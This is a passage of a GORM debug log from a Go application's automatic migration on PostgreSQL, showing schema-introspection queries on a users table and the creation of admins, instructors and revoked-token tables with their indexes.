2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.034ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.075ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.101ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.071ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.019ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.983ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.276ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.217ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.031ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.467ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.560ms] [34;1m[rows:0][0m CREATE TABLE "admins" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"user_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_admins_user" FOREIGN KEY ("user_id") REFERENCES "users"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.626ms] [34;1m[rows:0][0m CREATE UNIQUE INDEX IF NOT EXISTS "idx_admin_user" ON "admins" ("user_id")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.674ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_admins_deleted_at" ON "admins" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.693ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.305ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.477ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.629ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[29.499ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[26.966ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.971ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.342ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.927ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.444ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.508ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.458ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.279ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.492ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.585ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.471ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.301ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.204ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.384ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.578ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.636ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.140ms] [34;1m[rows:0][0m CREATE TABLE "instructors" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"account_verified" boolean NOT NULL DEFAULT false,"user_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_instructors_user" FOREIGN KEY ("user_id") REFERENCES "users"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.443ms] [34;1m[rows:0][0m CREATE UNIQUE INDEX IF NOT EXISTS "idx_instructor_user" ON "instructors" ("user_id")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.607ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_instructors_deleted_at" ON "instructors" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.818ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.825ms] [34;1m[rows:0][0m CREATE TABLE "revoked_tokens" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"token" text NOT NULL,PRIMARY KEY ("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.771ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_tokens_deleted_at" ON "revoked_tokens" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.657ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.521ms] [34;1m[rows:0][0m CREATE TABLE "revoked_refresh_tokens" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"refresh_token" text NOT NULL,PRIMARY KEY ("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.146ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_refresh_tokens_deleted_at" ON "revoked_refresh_tokens" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.844ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.257ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.614ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.607ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[30.541ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[28.531ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.351ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.106ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.075ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.218ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.077ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.060ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.055ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.124ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.183ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
